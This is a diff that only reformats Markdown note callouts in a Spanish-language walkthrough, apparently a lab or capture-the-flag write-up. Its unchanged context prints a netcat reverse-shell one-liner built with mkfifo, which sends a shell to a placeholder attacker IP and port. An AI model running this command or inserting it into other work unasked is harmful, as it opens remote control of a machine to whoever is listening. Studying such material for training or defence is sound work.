@@ -202,7 +202,7 @@ Nos habrá dado como resultado:
 ```
 
 
-> [!NOTE] 
+> [!NOTE]
 Como podemos observar, no tiene estilo, volveremos a utilizar la página recomendada para darle estilo y ver que dice, cabe resaltar que hay maneras más eficientes, pero para lo que hemos mirado, es lo que deberíamos de hacer.
 
 
@@ -546,7 +546,8 @@ Terminal 1:
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP de nuestra máquina] [Puerto] >/tmp/f
 ```
-> [!Note] Recordar cambiar lo que se encuentra dentro de los "[]"
+> [!NOTE]
+> Recordar cambiar lo que se encuentra dentro de los "[]"
 
 
 El comando completo quedaría:
